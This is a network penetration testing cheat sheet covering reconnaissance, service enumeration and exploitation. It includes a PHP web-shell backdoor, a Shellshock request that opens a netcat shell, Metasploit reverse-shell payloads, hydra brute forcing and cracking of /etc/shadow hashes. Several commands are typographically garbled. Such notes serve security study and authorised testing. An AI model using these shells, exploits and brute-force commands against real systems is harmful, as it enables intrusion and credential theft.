*Network penetration testing*

Pre-engagement
    Log all commands of the current session
    *script engagement_x.log
...
exit # when finished*

    Use keepnote or other to document findings
    Create a screenshot of the selected area and save it at home directory
    *$ alias ss='import ~/ss-$(date +%F_%H%M_%S).png'*
    Set the Target IP Address to the $ip system variable 
    *$ export ip=IP*


DNS enumeration
    Find name servers
        *$ host -t ns guif.re*
    Find email servers
        *$ host -t mx guif.re*
    Subdomain bruteforcing
        *$ for ip in $(cat list.txt); do host $ip.guif.re; done*
    Reverse dns lookup bruteforcing
        *$ for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"*
    Zone transfer request
        *$ host -l guif.re ns1.guif.re*
        *$ dnsrecon -d guif.re -t axfr*
    Finds nameservers for a given domain
        *$ host -t ns guif.re | cut -d " " -f 4 #*
        *$ dnsenum guif.re*
    Nmap zone transfer scan
        *$ nmap guif.re --script=dns-zone-transfer -p 53*
    Finds the domain names for a host.
        *$ whois guif.re*
    Find the IP and authoritative servers.
        *$ nslookup guif.re*
    Finds missconfigure DNS entries.
        *$ host -t ns guif.re*
    TheHarvester finds subdomains in google, bing, etc
        *$ python theHarvester.py  -l 500 -b all -d guif.re*

Port scanning
    Scan all 65536 ports TCP/UDP
    Find hosts alive
        *nmap -sP 192.168.0.1/24*
    Quick Nmap port enumeration
        *$ sudo nmap -vv -T5 -sS $ip  General nmap enumeration
        *$ sudo nmap -vv -Pn -A -sC -sS -T 4 -p- $ip  Identify hosts alive using ICMP ping
        *$ nmap -sn 192.168.0.1-250*
    3way handshake scan
        *$ nmap -nvv -w 1 IP 22-8*
    UDP scan
        *$ nmap -nvv -sU -w 1 $ip 22-81*
    UDP scanning consists on sending an empty UDP packet. Open: reply back. Closed: ICMP unreachable packet is received
    ARP Scan
        *$ arp-scan 10.10.10.1/28 -I eth0*
    Nmap ping scan
        *$ sudo nmap –sn -oA nmap_pingscan 10.10.10.1/24*
    Nmap SYN/Top 100 ports Scan
        *$ nmap -sS -F -oA nmap_fastscan 10.10.10.1/24*
    Services versions scan
        *$ nmap -sV $ip*
    Run the default scripts and normal port scan against all the found ports
        *$ nmap -sC $ip*
    Run all nmap scan scripts against found ports.
        *$ nmap -Pn -sV -O -pT:{TCP ports found},U:{UDP ports found} -script \*vuln\* $ip*

Service enumeration
    Fingerprints OS using TCP window size
        *$ nmap -O$ip  Fingerprints services using banner grabbing
        *$ nmap -A$ip  Fingerprints services using banner grabbing
        *$ nmap -sV$ipMB enumeration
    Versions 1,2,3. TCP 139, 445 and many UDP ports.
    Netbios scan
        *$ nbtscan -r 10.1.1.1/24*
    A null SMB session can be used to gather passwords and useful information from SMB 1.
    Null session and extract information.
        *$ nbtscan -r 10.1.1.1/24*
    Check for known SMB protocol vulnerabilities
        *$ nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 10.1.1.1*
    Nmap SMB enumeration
        *$ nmap -script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 10.0.0.1*
    Nmap Scan for Open SMB Shares 
    *$ nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 IP/24 *
    Nmap scans for vulnerable SMB Servers 
    *$ nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 IP *

NFS
    Show all mounts
    *$ showmount -e $ip*
    Mount a NFS share
    *$ mount $ip:/vol/share /mnt/nfs*

Directory bruteforcing
    *$ dirb $ip /usr/share/wordlists/dirb/common.txt*

Web enumeration
    *$ nikto -host $ip*
    *$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web_Content/Top1000-RobotsDisallowed.txt; gobuster -u http://$ip -w Top1000-RobotsDisallowed.txt*
    *$ wfuzz -c -z list.txt --sc 200 http://$ip*


Mysql enumeration
    *$ nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip -p 3306*

MsSql enumeration
    Enumerate MSSQL Servers on the network
    *msf > use auxiliary/scanner/mssql/mssql_ping
    nmap -sU --script=ms-sql-info $ip*
    Bruteforce MsSql
    *msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login*
    Gain shell using gathered credentials
    *msf > use exploit/windows/mssql/mssql_payload
    msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp*

SMTP enumeration
    Always do users enumeration
    *smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip*
    Command to check if a user exists
        *>VRFY root*
    Command to ask the server if a user belongs to a mailing list
        *>EXPN root*
    Nmap scan
        *$ nmap -script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip*
    Another vulnscan:
    *$ nmap -p139,445 --script=smb-vuln-* --script-args=unsafe=1 $ip*

    Metasploit user enumeration
    *use auxiliary/scanner/smtp/smtp_enum*


RPCBind
    Enumerate:
    *rpcinfo -p $ip*

FTP enumeration
    Enumerate:
        *$ nmap -script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip*
    Bruteforce
        *$ hydra -l user -P /usr/share/john/password.lst ftp://guif.re:21*
    Bruteforce with metasploit
    *$ msfconsole -q msf> search type:auxiliary login msf> use auxiliary/scanner/ftp/ftp_login*
    Vulnscan
    *$ nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip*

SSL connection
    *$ openssl s_client -connect $ip:443*

Basic SSL ciphers check
    Nmap scan
        *$ nmap --script ssl-enum-ciphers -p 443 $ip*
    Look for unsafe ciphers such as Triple-DES and Blowfish
    Very complete tool for SSL auditing is testssl.sh, finds BEAST, FREAK, POODLE, heart bleed, etc...

NSE enumeration
    SMB discovery
        *$ nmap $ip --script smb-os-discovery.nse*
    SMB version
        *msfconsole; use scanner/smb/smb_version; set RHOSTS $ip; run*
    MultiExploit
        *msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost $ip; run*

Simple  Network  Management  Protocol (SNMP) enumeration
    *$ snmpwalk -c public -v1 $ip
    $ snmpcheck -t $ip -c public *
    Based on UDP, stateless and susceptible to UDP spoofing
    *$ nmap -sU --open -p 16110.1.1.1-254 -oG out.txt*
    *$ snmpwalk -c public -v1  10.1.1.1 # we need to know that there is a community called public*
    *$ snmpwalk –c public –v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25 # enumerate windows users*
    *$ snmpwalk 5c public 5v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2 # enumerates running processes*
    *$ nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip
$snmp-check -t $ip -c public*

Email addresses enumeration
    Find emails in google, bing, pgp etc
        *$ theharvester -d $ip -b google*
    Fontact information for the domains they host
        *$ whois $ip*
    Recon-ng scan
    *$ recon-ng; use module; set DOMAIN $ip; run;
    Finds emails and employee name
        *recon/contacts/gather/http/api/whois_pocs*
    Finds xss published ad xssed.co
        *recon/hosts/enum/http/web/xssed*
    Finds subdomain
        *recon/hosts/gather/http/web/google_site*
    Finds IPs close to the domain and possible new domains
        *recon/hosts/gather/http/web/ip_neighbor*

Google search
    site:xxx -site:www.xxx
    filetype: look for specific documents, pdf, docx, etc..
    inurl
    intitle
    Others https://www.exploit-db.com/google-hacking-database/



Vulnerability scanning
    Search services vulnerabilities
    *$ searchsploit apache 2.2.3*
    *$ msfconsole; > search apache 2.2.3*

    nmap has many vulnerability scanning NSE scripts in /usr/share/nmap/scripts/
    OpenVAS
        Powerful vulnerability scanner with thousands of scan checks. Setup:
    *$ openvas-setup; openvas-adduser; gsd*


SMTP, testing for open relay
    SMTP relay, EXPN/VRFY command enabled
    *telnet $ip 25
    EHLO root
    MAIL FROM:root@target.com
    RCPT TO:example@gmail.com
    DATA
    Subject: Testing open mail relay.
    Testing SMTP open mail relay. Have a nice day.
    .
    QUIT*

POP3
    Test authentication:
    *telnet $ip 110
USER uer@$ip
PASS admin*


Password cracking
    Find the type of hash:
    *$ hash-identifier*
    Find hash type https://hashkiller.co.uk
    Paste the entire /etc/shadow in file and run
        *$ john hashes.txt*
    Paste the entire /etc/shadow in file and run
        *$ john hashes.txt*
    GPU cracking:
        *$ hashcat -m 500 -a 0 -o output.txt -remove hashes.txt /usr/share/wordlists/rockyou.txt*
    CPU cracking:
        *$ john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump*

Bruteforce authentication
    *$ hydra 10.0.0.1 http-post-form “/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin*

SSH bruteforce
    *$ hydra -l root -P password-file.txt $ip ssh *

Tunneling your traffic through another host
    *$ sshuttle -r root@10.0.0.1 10.10.10.0/24*


Transfering files
    First step after gaining access to a remote machine is to upload new tools.
    Linux tools: netcat, curl, wget
    Windows: ftp, tftp, power shell script to echo and write.
    Download file with curl:
    *$ curl -O http://host/file*

Backdoors
    Php
    *<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>*

Transfering files
    Start a web server in your local machine serving files within the current folder:
    *$ python -m SimpleHTTPServer*
    *$ php -S $ip:80*
    Send files using different commands:
    *$ nc -nlvp 4444 > incoming.exe*
    As an FTP server, metasploit has built in one:
    *use auxiliary/server/ftp
auxiliary/server/tftp*
    SMB share server:
    *python smbserver.py WORKSPACE /dir*
    Curl put:
    *$ curl -T 'file' 'http://$ip'

    Linux, mounting a samba share:
    *smbclient -L 1.1.1.1 --no-pass*

Shellshock
    The following tool will test it.
    *git clone https://github.com/nccgroup/shocker; ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose*
    You can also:
    *echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80*

HeartBleed
    Test web server
    *$ sslscan $ip:443*

Tunnelling with Local port forwarding
    This is useful when you are trying to connect from your machine to a destination using a gateway. The syntax is:
    *$ ssh -L local_port:remote_host:remote_port gateway_host*
    You can later create a SSH session to the local port and have and SSH tunneled to destination:
    *$ ssh -L 31337:banned_machine:22 hop_machine
    $ ssh -p 31337 localhost*

Reverse Tunnelling with remote port forwarding
    This is useful when you are trying to connect to a host, behind a firewall that blocks incomming connections. This technique works as the previous one, but the connection is started from the gateway. The syntax is:

    *$ ssh -R 9001:destination_host:destination_host client_ip # Executed from gateway*

Dynamic Port Forwarding
    You can configure a local port to forward traffic to multiple destinations passing through a single host. It is similar to local port forwarding but allows multiple destinations. It uses the SOCKS protocol. The syntax is:
    *$ ssh -D local_port remote_add *
    The connection of the previous command is established at port 22 of remote addr.

CVEs
    *http://www.cvedetails.com/
https://www.exploit-db.com/*
